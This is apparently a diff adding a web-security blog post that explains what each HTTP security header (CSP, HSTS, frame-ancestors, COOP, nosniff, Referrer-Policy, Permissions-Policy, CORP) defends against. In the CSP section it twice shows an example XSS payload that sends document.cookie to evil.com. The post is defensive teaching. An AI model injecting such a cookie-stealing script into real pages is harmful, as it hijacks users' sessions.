@@ -1,0 +1,222 @@
+---
+layout: base.njk
+title: "What your security headers actually do — Penumbra Forge"
+description: "A practical breakdown of every HTTP security header — what attack each one prevents, what happens when it's missing, and how to stop copying configs you don't understand."
+permalink: /blog/what-your-security-headers-actually-do/
+---
+
+<link rel="stylesheet" href="/css/blog.css">
+
+<header class="site-header" id="site-header">
+  <a href="/" class="site-header-brand" title="Penumbra Forge">
+    <div class="site-header-orb" aria-hidden="true"><div class="site-header-orb-backlight"></div><div class="site-header-orb-corona"></div><div class="site-header-orb-glow"></div><div class="site-header-orb-edge"></div><div class="site-header-orb-shadow"></div></div>
+  </a>
+  <button class="site-header-toggle" aria-label="Toggle menu"><svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.5"><line x1="3" y1="5" x2="17" y2="5"/><line x1="3" y1="10" x2="17" y2="10"/><line x1="3" y1="15" x2="17" y2="15"/></svg></button>
+  <nav class="site-header-nav">
+    <a href="/">Home</a>
+    <a href="/tools/">Tools</a>
+    <a href="/labs/">Labs</a>
+    <a href="/blog/" class="active">Blog</a>
+    <a href="/gate/">Gate</a>
+    <a href="/librarian/">Librarian</a>
+    <a href="https://github.com/penumbraforge" target="_blank" rel="noopener">GitHub</a>
+  </nav>
+</header>
+
+<div class="blog-page">
+  <article class="blog-article">
+    <div class="blog-article-header">
+      <h1>What your security headers actually do</h1>
+      <div class="blog-post-meta">
+        <span class="blog-post-date">March 26, 2026</span>
+        <span class="blog-post-tag">security</span>
+        <span class="blog-post-tag">http headers</span>
+        <span class="blog-post-read">10 min read</span>
+      </div>
+    </div>
+
+    <p class="blog-article-lede">Most sites have security headers they copied from a blog post in 2019. Nobody on the team can explain what half of them do. The headers get deployed, the security scanner turns green, and everyone moves on. Then an attacker shows up who actually understands what's missing.</p>
+
+    <div class="blog-body">
+      <p>I'm not going to give you a config to copy. I'm going to explain what each header prevents — the actual attack — so you can make decisions about your own site instead of cargo-culting somebody else's.</p>
+
+      <h2>Content-Security-Policy: the one that matters most</h2>
+      <p>CSP is the single most impactful security header you can set. It tells the browser which sources are allowed to load scripts, styles, images, fonts, and other resources on your page. Everything not explicitly allowed gets blocked.</p>
+      <p>Here's the attack it prevents: an attacker finds an XSS vulnerability in your application — maybe a reflected parameter, maybe a stored comment field, maybe a DOM manipulation. They inject <code>&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;</code>. Without CSP, the browser executes it. Your users' sessions get stolen.</p>
+      <p>With a proper CSP, the browser refuses to run that script because <code>evil.com</code> isn't in your allowed sources. The XSS vulnerability still exists in your code, but the damage is contained.</p>
+
+      <h3>The unsafe-inline problem</h3>
+      <p>Here's where most CSPs fall apart:</p>
+      <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'</code></pre>
+      <p>That <code>'unsafe-inline'</code> directive destroys your CSP. It tells the browser "allow any inline script to execute" — which is exactly what XSS payloads are. You've written a policy that explicitly permits the attack you're trying to prevent.</p>
+      <p>I see this constantly. Teams add CSP, their inline <code>&lt;script&gt;</code> tags break, someone adds <code>'unsafe-inline'</code> to fix the errors, and now the header is decoration.</p>
+
+      <h3>Nonces: the actual solution</h3>
+      <p>Instead of allowing all inline scripts, you generate a random nonce per request and attach it to the scripts you control:</p>
+      <pre><code>Content-Security-Policy: script-src 'nonce-a8f29e3b7c' 'strict-dynamic'
+
+&lt;script nonce="a8f29e3b7c"&gt;
+  // This runs — it has the correct nonce
+&lt;/script&gt;
+
+&lt;script&gt;
+  // This is blocked — no nonce
+  fetch('https://evil.com/steal?cookie='+document.cookie)
+&lt;/script&gt;</code></pre>
+      <p>The nonce must be cryptographically random and different on every page load. If an attacker can predict the nonce, the protection is gone. If you're serving static HTML from a CDN and can't generate per-request nonces, use hashes instead — you hash each inline script's contents and include that hash in the policy.</p>
+      <p>The <code>'strict-dynamic'</code> directive tells the browser that scripts loaded by your nonced scripts are also trusted. Without it, you'd need to list every CDN and third-party domain explicitly.</p>
+
+      <div class="blog-callout blog-callout-insight">
+        <strong>A good starting CSP:</strong> <code>default-src 'self'; script-src 'nonce-{random}' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'</code> — Yes, <code>'unsafe-inline'</code> for styles is generally acceptable. Style injection is a much weaker attack vector than script injection. The risk is CSS exfiltration of attribute values, which is real but far less severe than arbitrary JS execution.
+      </div>
+
+      <h2>Strict-Transport-Security: preventing the invisible downgrade</h2>
+      <p>HSTS tells the browser "never connect to this domain over plain HTTP — always use HTTPS." That sounds trivial in 2026. Everyone has HTTPS. Why does this matter?</p>
+      <p>Because of SSL stripping. Here's how the attack works in practice:</p>
+      <p>You're at a coffee shop. You connect to the WiFi. You type <code>yourbank.com</code> into your browser. Your browser sends an HTTP request to port 80. The attacker sitting on the network intercepts that request. Instead of forwarding it to the bank, they make their own HTTPS connection to the bank and relay content back to you over HTTP. You see the site. It works. You log in. The attacker sees your credentials in plaintext because your connection to them is HTTP.</p>
+      <p>Your browser never upgraded to HTTPS because the attacker intercepted the redirect. Without HSTS, the browser has no way to know it should have been HTTPS.</p>
+
+      <pre><code># Bad — too short, no subdomains, not preloaded
+Strict-Transport-Security: max-age=86400
+
+# Good
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload</code></pre>
+
+      <p>The <code>max-age</code> is how long (in seconds) the browser remembers. 63072000 is two years. <code>includeSubDomains</code> covers every subdomain. <code>preload</code> lets you submit your domain to the browser's hardcoded HSTS list so even the first visit is protected.</p>
+
+      <div class="blog-callout blog-callout-warning">
+        <strong>Be careful with includeSubDomains.</strong> If any subdomain doesn't support HTTPS — a legacy internal tool, a vendor CNAME, anything — it will become inaccessible. Audit every subdomain before you set this. There's no "undo" short of waiting for max-age to expire in every browser that visited your site.
+      </div>
+
+      <h2>X-Frame-Options and COOP: the clickjacking defense</h2>
+      <p>Clickjacking is one of those attacks that sounds implausible until you see it work. The attacker loads your site in an invisible iframe on their page. They position their own UI over it. The victim thinks they're clicking a button on the attacker's page, but they're actually clicking a button on your site — inside the iframe.</p>
+      <p>The victim is logged into your site. Their session cookies get sent with the click. They just performed an action on your application without knowing it. Changed their email. Transferred funds. Deleted their account.</p>
+
+      <pre><code># Old way (still works, still worth setting)
+X-Frame-Options: DENY
+
+# New way (CSP directive — more flexible)
+Content-Security-Policy: frame-ancestors 'none'
+
+# If you need to allow framing from your own origin
+Content-Security-Policy: frame-ancestors 'self'</code></pre>
+
+      <p><code>X-Frame-Options</code> is the legacy header. <code>frame-ancestors</code> in CSP is the modern replacement. Set both — older browsers might only support the former.</p>
+
+      <h3>Cross-Origin-Opener-Policy (COOP)</h3>
+      <p>COOP is related but different. When your site opens a popup (or is opened as a popup), COOP controls whether the opener and the opened window can reference each other.</p>
+
+      <pre><code>Cross-Origin-Opener-Policy: same-origin</code></pre>
+
+      <p>Without this, if a user clicks a link to an attacker's site that opens via <code>window.open</code>, the attacker's page can use <code>window.opener</code> to navigate your page to a phishing URL. The user switches back to "your" tab and sees a login page — because the attacker replaced it. This is called tab-nabbing, and it's surprisingly effective.</p>
+      <p><code>same-origin</code> severs that reference entirely. Cross-origin windows can't touch each other.</p>
+
+      <h2>X-Content-Type-Options: the IE legacy that still matters</h2>
+      <p>This header has exactly one valid value:</p>
+
+      <pre><code>X-Content-Type-Options: nosniff</code></pre>
+
+      <p>Here's the problem it solves. Browsers historically tried to be "helpful" by guessing the content type of a response, regardless of what the <code>Content-Type</code> header said. You serve a file with <code>Content-Type: text/plain</code>, but the content starts with <code>&lt;html&gt;&lt;script&gt;</code>. The browser looks at the content, decides "this is actually HTML," and renders it — executing the script.</p>
+      <p>The attack: an attacker uploads a file to your site. Maybe it's an image upload that accepts any file. The file is actually HTML with embedded JavaScript. Your server serves it as <code>text/plain</code> or <code>application/octet-stream</code>. Without <code>nosniff</code>, the browser renders it as HTML. The script runs in your origin. The attacker just achieved XSS through a file upload.</p>
+      <p>This was originally an IE problem, but MIME sniffing exists in every browser to varying degrees. <code>nosniff</code> tells the browser to trust the Content-Type header and never guess. There's no reason not to set it. There are no trade-offs. Just set it.</p>
+
+      <h2>Referrer-Policy: controlling what leaks</h2>
+      <p>When a user clicks a link from your site to another site, the browser sends a <code>Referer</code> header (yes, it's misspelled — the typo is in the HTTP spec from 1996 and we're stuck with it forever). That header contains the URL they came from.</p>
+      <p>Why this matters: if your URLs contain sensitive information — session tokens, search queries, user IDs, internal path structures — you're leaking that to every external site your users visit.</p>
+
+      <pre><code># Bad — leaks full URL to everyone
+Referrer-Policy: unsafe-url
+
+# Bad — leaks full URL to same-origin, origin to cross-origin
+Referrer-Policy: no-referrer-when-downgrade
+
+# Good for most sites
+Referrer-Policy: strict-origin-when-cross-origin
+
+# Maximum privacy
+Referrer-Policy: no-referrer</code></pre>
+
+      <p><code>strict-origin-when-cross-origin</code> is the best balance for most applications. Same-origin navigations get the full URL (which your own analytics probably need). Cross-origin navigations get only the origin (<code>https://yoursite.com</code>, no path). Downgrades from HTTPS to HTTP get nothing.</p>
+      <p>If you're running a site where even the origin shouldn't be leaked — think whistleblower platforms, health portals, anything sensitive — use <code>no-referrer</code>.</p>
+
+      <div class="blog-callout blog-callout-insight">
+        <strong>Check your URLs.</strong> If you have routes like <code>/account/reset?token=abc123</code> or <code>/admin/users/42/edit</code>, any external resource on those pages (images, scripts, iframes) receives that full URL as a referrer by default. Referrer-Policy protects outbound links, but also set <code>rel="noreferrer"</code> on links where it matters.
+      </div>
+
+      <h2>Permissions-Policy: the one most people skip</h2>
+      <p>Permissions-Policy (formerly Feature-Policy) restricts which browser APIs your page can use. Camera. Microphone. Geolocation. Payment. Accelerometer. USB. Bluetooth.</p>
+      <p>The question I always get: "Why would I restrict APIs I'm not using?"</p>
+      <p>Because of third-party scripts. If you load a third-party analytics script, ad network, chat widget, or any external JavaScript, that script runs with the same permissions as your own code. If you don't set Permissions-Policy, a compromised ad script can silently access the camera, request geolocation, or probe USB devices.</p>
+
+      <pre><code># Deny everything, then allow what you need
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), bluetooth=(), accelerometer=(), gyroscope=(), magnetometer=(), interest-cohort=()
+
+# If you actually need camera for your own origin
+Permissions-Policy: camera=(self), microphone=(), geolocation=()</code></pre>
+
+      <p>The <code>()</code> syntax means "deny for everyone including this page." <code>(self)</code> means "allow only for this origin." You can also allow specific origins: <code>camera=(self "https://video.example.com")</code>.</p>
+      <p>That <code>interest-cohort=()</code> at the end opts you out of Google's FLoC/Topics API — the advertising tracking system built into Chrome. Whether that matters to you depends on your stance on user privacy. Mine is obvious.</p>
+
+      <h2>Cross-Origin-Resource-Policy: the newest one nobody sets</h2>
+      <p>CORP tells the browser who is allowed to load your resources. Not who can frame your page (that's frame-ancestors) — who can load your images, scripts, fonts, and API responses.</p>
+
+      <pre><code>Cross-Origin-Resource-Policy: same-origin</code></pre>
+
+      <p>Without CORP, any site on the internet can embed your images, load your scripts, and make requests to your API endpoints that return data (via <code>&lt;script&gt;</code> tags, <code>&lt;img&gt;</code> tags, etc.). This enables a class of attacks called cross-origin information leaks — attackers use side channels like timing, error events, or response sizes to extract data from your endpoints.</p>
+      <p>The Spectre CPU vulnerability made this real. Before Spectre, browsers' same-origin policy prevented reading cross-origin responses. After Spectre, any data that enters the renderer process can potentially be read through speculative execution side channels. CORP prevents the data from entering the process in the first place.</p>
+
+      <pre><code># If your resources should only be loaded by your own origin
+Cross-Origin-Resource-Policy: same-origin
+
+# If you need subdomains to load your resources
+Cross-Origin-Resource-Policy: same-site
+
+# If you're a CDN or intentionally public API
+Cross-Origin-Resource-Policy: cross-origin</code></pre>
+
+      <p>Most applications should use <code>same-origin</code>. If you're serving a public API or hosting assets on a CDN subdomain, <code>same-site</code> or <code>cross-origin</code> is appropriate — but make that a conscious choice, not a default.</p>
+
+      <div class="blog-callout blog-callout-warning">
+        <strong>CORP can break things.</strong> If you set <code>same-origin</code> on a CDN that serves assets to multiple domains, those domains will stop loading your assets. Test this thoroughly. Start with <code>Cross-Origin-Resource-Policy: same-site</code> if you're not sure, and tighten it later.
+      </div>
+
+      <h2>What a complete set looks like</h2>
+      <p>Here's a reasonable set of security headers for a typical web application. Not a copy-paste config — read everything above first and adjust for your architecture.</p>
+
+      <pre><code>Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin</code></pre>
+
+      <p>That's eight headers. Each one addresses a specific, documented attack vector. None of them are redundant (well, <code>X-Frame-Options</code> and <code>frame-ancestors</code> overlap, but backward compatibility matters).</p>
+
+      <h2>What doesn't matter as much</h2>
+      <p>A few things I see people stress about that aren't worth the anxiety:</p>
+      <p><strong>X-Powered-By</strong> — removing the <code>X-Powered-By: Express</code> header is fine hygiene, but it's not a security header. An attacker who needs to know your framework to attack you isn't much of an attacker. Remove it, but don't pat yourself on the back.</p>
+      <p><strong>X-XSS-Protection</strong> — this is the old IE/Chrome XSS auditor. It's been deprecated and removed from every modern browser. Don't set it. If you already have it, setting it to <code>0</code> is actually safer than <code>1; mode=block</code> because the auditor itself had vulnerabilities that could be exploited.</p>
+      <p><strong>Server header</strong> — same as X-Powered-By. Nice to remove, not a security measure.</p>
+
+      <h2>Check your own site</h2>
+      <p>I built a tool that scans any site's security headers and explains exactly what's missing and why it matters. It's not a score for the sake of a score — it tells you which attacks you're exposed to.</p>
+      <p><a href="/tools/site-score/">Run it against your site</a> and see what you're actually missing. You might be surprised how many headers you thought were set aren't.</p>
+    </div>
+
+    <div class="blog-post-footer">
+      <div class="blog-author">
+        <div class="blog-author-avatar"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
+        <div>
+          <div class="blog-author-name">Shadoe Myers</div>
+          <div class="blog-author-role">Senior InfoSec Engineer — Penumbra Forge</div>
+        </div>
+      </div>
+      <div class="blog-nav-links">
+        <a href="/blog/" class="blog-nav-link">&larr; All posts</a>
+        <a href="/tools/site-score/" class="blog-nav-link">Scan your headers &rarr;</a>
+      </div>
+    </div>
+  </article>
+</div>
